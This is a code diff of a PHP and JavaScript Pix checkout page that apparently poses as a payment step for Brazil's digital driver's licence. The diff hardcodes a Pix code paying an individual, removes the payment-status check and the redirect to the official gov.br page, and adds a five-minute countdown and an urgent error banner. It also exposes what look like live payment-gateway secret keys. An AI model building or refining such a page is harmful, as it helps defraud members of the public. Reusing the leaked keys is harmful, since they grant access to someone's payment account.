@@ -1,7 +1,28 @@
 <?php
-// Se o JavaScript chamar a página pedindo o PIX, executa a API e para o código aqui
+// =========================================================================
+// CONTROLE MANUAL DE CONTINGÊNCIA (COPIA E COLA)
+// Seu código Pix está ativo aqui. Para voltar ao automático futuramente,
+// basta apagar o texto de dentro das aspas e deixar: $pix_copia_cola_manual = "";
+// =========================================================================
+$pix_copia_cola_manual = "00020101021126580014br.gov.bcb.pix013607e7643c-fccd-476b-a87f-ce7d073bc26f5204000053039865406175.475802BR5917Mariana Rodrigues6009SAO PAULO61080846133062280524pqt5zGEk15MMZPh0GKRo6g8y6304957D"; 
+
+// Se o JavaScript chamar a página pedindo o PIX, executa a API ou usa o manual
 if (isset($_GET['action']) && $_GET['action'] == 'gerar_pix') {
     header('Content-Type: application/json; charset=utf-8');
+
+    // Se houver um código manual configurado, pula a API e usa ele
+    if (!empty($pix_copia_cola_manual)) {
+        $identifier = "MANUAL_" . time();
+        $qr_code_visual = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode($pix_copia_cola_manual);
+        
+        echo json_encode([
+            "success" => true,
+            "pix_code" => $pix_copia_cola_manual,
+            "transaction_id" => $identifier,
+            "qr_code_visual" => $qr_code_visual
+        ]);
+        exit;
+    }
 
     // CREDENCIAIS DA SUA CONTA - SIGILOPAY
     $public_key = "youssefzeroki_9gstvyrvv0avmv17"; 
@@ -81,33 +102,6 @@ if (isset($_GET['action']) && $_GET['action'] == 'gerar_pix') {
         "transaction_id" => $transaction_id,
         "qr_code_visual" => $qr_code_visual
     ]);
-    exit;
-}
-
-if (isset($_GET['action']) && $_GET['action'] == 'consultar_status' && isset($_GET['id'])) {
-    header('Content-Type: application/json');
-    
-    $transaction_id = $_GET['id'];
-    $public_key = "youssefzeroki_9gstvyrvv0avmv17";
-    $secret_key = "8snoikonrantx0qn6ufq9hxou8w1qf5dxvcxb4oavntglk67o5y502s60tpcwtf6";
-    
-    $url = "https://app.sigilopay.com.br/api/v1/gateway/pix/status/" . $transaction_id;
-    
-    $ch = curl_init($url);
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_HTTPHEADER => [
-            'Accept: application/json',
-            'x-public-key: ' . $public_key,
-            'x-secret-key: ' . $secret_key
-        ],
-        CURLOPT_TIMEOUT => 15
-    ]);
-    
-    $response = curl_exec($ch);
-    curl_close($ch);
-    
-    echo $response;
     exit;
 }
 ?>
@@ -393,7 +387,7 @@ if (isset($_GET['action']) && $_GET['action'] == 'consultar_status' && isset($_G
         </div>
     </div>
 
-    <!-- CONTEÚDO DO PIX (RELEVASSE APÓS FINALIZAR O CARREGAMENTO) -->
+    <!-- CONTEÚDO DO PIX -->
     <div id="pixData" style="display: none;">
         <div class="instability-alert">
             <div class="highlight-notice">🛑 Se ocorrer qualquer erro, atualize a página ou tente utilizar outra instituição bancária!</div>
@@ -445,9 +439,7 @@ if (isset($_GET['action']) && $_GET['action'] == 'consultar_status' && isset($_G
 
 <script>
 let transactionId = null;
-let statusInterval = null;
 let timerInterval = null;
-const redirectUrl = "https://www.gov.br/pt-br/servicos/emitir-a-carteira-nacional-de-habilitacao-digital-cnh-e";
 
 window.onload = function() {
     let progress = 0;
@@ -469,7 +461,7 @@ window.onload = function() {
         }
     }, 200);
 
-    // Requisição real da API (inalterada)
+    // Requisição interna que carrega os dados manuais
     fetch('?action=gerar_pix')
         .then(res => res.json())
         .then(data => {
@@ -489,9 +481,8 @@ window.onload = function() {
                     document.getElementById("statusTitle").innerText = "Aguardando Pagamento";
                     document.getElementById("pixData").style.display = "block";
 
-                    // Inicia cronômetro e consulta de status
+                    // Inicia cronômetro de 5 minutos
                     startTimer(300);
-                    statusInterval = setInterval(checkStatus, 5000);
                 }, 400);
 
             } else {
@@ -520,7 +511,6 @@ function startTimer(duration) {
 
         if (--timer < 0) {
             clearInterval(timerInterval);
-            clearInterval(statusInterval);
             handleExpiration();
         }
     }, 1000);
@@ -549,31 +539,6 @@ function copyPix() {
         btn.classList.add("success");
         setTimeout(() => { btn.innerText = "COPIAR CÓDIGO PIX"; btn.classList.remove("success"); }, 3000);
     });
-}
-
-function checkStatus() {
-    if (!transactionId) return;
-    
-    fetch(`?action=consultar_status&id=${transactionId}`)
-        .then(res => res.json())
-        .then(data => {
-            if (data && (data.status === 'paid' || data.status === 'succeeded' || data.status === 'approved' || data.status === 'CONFIRMED')) {
-                clearInterval(timerInterval);
-                clearInterval(statusInterval);
-                
-                // Atualiza o status informando a confirmação do pagamento
-                const statusTitle = document.getElementById("statusTitle");
-                statusTitle.innerText = "PAGAMENTO CONFIRMADO!";
-                statusTitle.style.background = "#f6ffed";
-                statusTitle.style.color = "#389e0d";
-                statusTitle.style.borderColor = "#b7eb8f";
-                
-                setTimeout(() => {
-                    window.location.href = redirectUrl;
-                }, 2000);
-            }
-        })
-        .catch(err => console.error("Erro ao verificar status:", err));
 }
 </script>
 
